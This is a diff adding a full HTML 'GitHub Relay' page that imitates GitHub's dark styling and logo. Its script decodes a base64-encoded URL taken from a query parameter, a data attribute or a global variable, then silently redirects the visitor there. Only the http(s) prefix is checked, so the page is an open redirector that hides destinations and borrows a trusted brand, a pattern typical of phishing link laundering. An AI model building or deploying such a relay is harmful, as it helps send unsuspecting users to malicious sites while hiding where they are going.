@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>GitHub Dark Relay • Base64 Redirect</title>
+  <meta name="description" content="Secure jump page (GitHub Dark look) that decodes a base64 URL and redirects."/>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+
+  <!-- CSP: no external fetches needed; keep inline script allowed -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src  'self' 'unsafe-inline';
+    style-src   'self';
+    connect-src 'self'
+  "/>
+
+  <link rel="stylesheet" href="gh-dark-v6.css"/>
+</head>
+<body>
+  <div class="wrap">
+    <header class="hero" role="banner" aria-label="Service header">
+      <h1>GitHub Relay</h1>
+      <span class="badge" title="visual style">Base64 redirect</span>
+      <div class="logo" aria-hidden="true">
+        <!-- GitHub mark (Octicon) -->
+        <svg viewBox="0 0 24 24" width="28" height="28" role="img" aria-label="GitHub">
+          <path fill="currentColor" d="M12 0C5.37 0 0 5.37 0 12c0 5.3 3.438 9.8 8.205 11.387.6.11.82-.26.82-.577 0-.285-.01-1.04-.015-2.04-3.338.726-4.042-1.61-4.042-1.61-.546-1.386-1.333-1.756-1.333-1.756-1.09-.745.084-.729.084-.729 1.205.084 1.84 1.236 1.84 1.236 1.07 1.835 2.807 1.305 3.492.997.107-.775.418-1.305.762-1.605-2.665-.305-5.466-1.332-5.466-5.93 0-1.312.469-2.382 1.236-3.22-.124-.303-.536-1.527.117-3.176 0 0 1.008-.322 3.3 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.29-1.552 3.297-1.23 3.297-1.23.655 1.65.243 2.873.12 3.176.77.838 1.235 1.908 1.235 3.22 0 4.61-2.803 5.624-5.475 5.92.43.37.823 1.096.823 2.21 0 1.595-.014 2.88-.014 3.27 0 .32.216.694.825.576C20.565 21.796 24 17.297 24 12c0-6.63-5.37-12-12-12z"></path>
+        </svg>
+      </div>
+    </header>
+
+    <section class="panel" role="status" aria-live="polite">
+      <h2>Decoding a base64 URL…</h2>
+      <p class="muted">Provide the link as base64 and we’ll send you there automatically.</p>
+
+      <div class="grid" aria-label="Options and info">
+
+        <div class="card">
+          <h4>Manual open</h4>
+          <p>If auto-redirect pauses, you can proceed manually.</p>
+          <p><a id="cta" href="#" aria-disabled="true" rel="noopener noreferrer">Continue</a></p>
+        </div>
+      </div>
+
+      <div id="progress" class="status-line" role="progressbar"
+           aria-valuemin="0" aria-valuemax="100" aria-valuenow="10" aria-valuetext="Initializing">
+        <span id="ghd-status">Starting…</span>
+        <span class="dot dot-1" aria-hidden="true"></span>
+        <span class="dot dot-2" aria-hidden="true"></span>
+        <span class="dot dot-3" aria-hidden="true"></span>
+      </div>
+
+      <div id="ghd-note" class="note small" hidden></div>
+    </section>
+
+    <noscript>
+      <div class="panel note">JavaScript is required to continue.</div>
+    </noscript>
+
+    <footer class="footer" role="contentinfo">
+      <span>GitHub Dark visual style for familiarity. Not affiliated with GitHub.</span>
+      <a href="#" aria-disabled="true">Source on GitHub</a>
+    </footer>
+  </div>
+
+  <!-- Set the base64 here if you prefer inline attribute: data-target="aHR0cHM6Ly9leGFtcGxlLmNvbS8" -->
+  <script id="ghd-script" data-target="">
+  (function() {
+    const statusEl = document.getElementById('ghd-status');
+    const noteEl = document.getElementById('ghd-note');
+    const progressEl = document.getElementById('progress');
+    const cta = document.getElementById('cta');
+    const selfScript = document.currentScript;
+
+    // optional: set window.B64_TARGET = "aHR0cHM6Ly9leGFtcGxlLmNvbS8=" before this script
+    const getFromGlobal = () => (typeof window.B64_TARGET === 'string' && window.B64_TARGET.trim()) ? window.B64_TARGET.trim() : null;
+    const getFromAttr = () => (selfScript && selfScript.dataset && selfScript.dataset.target) ? selfScript.dataset.target.trim() : null;
+    const getFromQuery = () => {
+      const sp = new URLSearchParams(window.location.search);
+      return (sp.get('c') || sp.get('b64') || sp.get('base64') || '').trim() || null;
+    };
+
+    const urlsafeToStd = (b64) => b64.replace(/-/g, '+').replace(/_/g, '/');
+    const padB64 = (b64) => {
+      const mod = b64.length % 4;
+      return mod ? (b64 + '='.repeat(4 - mod)) : b64;
+    };
+
+    const decodeB64 = (b64) => {
+      try {
+        return atob(padB64(urlsafeToStd(b64)));
+      } catch (e) {
+        throw new Error('Invalid base64 string');
+      }
+    };
+
+    const setProgress = (now, text) => {
+      progressEl.setAttribute('aria-valuenow', String(now));
+      if (text) progressEl.setAttribute('aria-valuetext', text);
+    };
+
+    const showNote = (msg) => {
+      noteEl.textContent = msg;
+      noteEl.hidden = false;
+    };
+
+    cta.addEventListener('click', (e) => {
+      if (cta.getAttribute('aria-disabled') === 'true') e.preventDefault();
+    });
+
+    statusEl.textContent = 'Reading base64 input…';
+    setProgress(20, 'Reading base64 input');
+
+    const encoded = getFromQuery() || getFromAttr() || getFromGlobal();
+
+    if (!encoded) {
+      statusEl.textContent = 'No base64 provided';
+      setProgress(100, 'No input');
+      showNote('Provide the target via ?c=... or data-target or window.B64_TARGET.');
+      return;
+    }
+
+    let target = null;
+    try {
+      target = decodeB64(encoded);
+    } catch (err) {
+      statusEl.textContent = 'Base64 decode failed';
+      setProgress(100, 'Decode error');
+      showNote(err && err.message ? err.message : String(err));
+      return;
+    }
+
+    if (!/^https?:\/\//i.test(target)) {
+      statusEl.textContent = 'Unexpected URL format';
+      setProgress(100, 'Validation error');
+      showNote('Decoded value must start with http:// or https://');
+      return;
+    }
+
+    statusEl.textContent = 'Opening destination…';
+    setProgress(70, 'Preparing redirect');
+
+    // enable manual controls
+    cta.setAttribute('aria-disabled', 'false');
+    cta.href = target;
+    cta.rel = 'noopener noreferrer';
+
+    setTimeout(() => {
+      setProgress(100, 'Redirecting');
+      window.location.replace(target);
+    }, 250);
+  })();
+  </script>
+</body>
+</html>
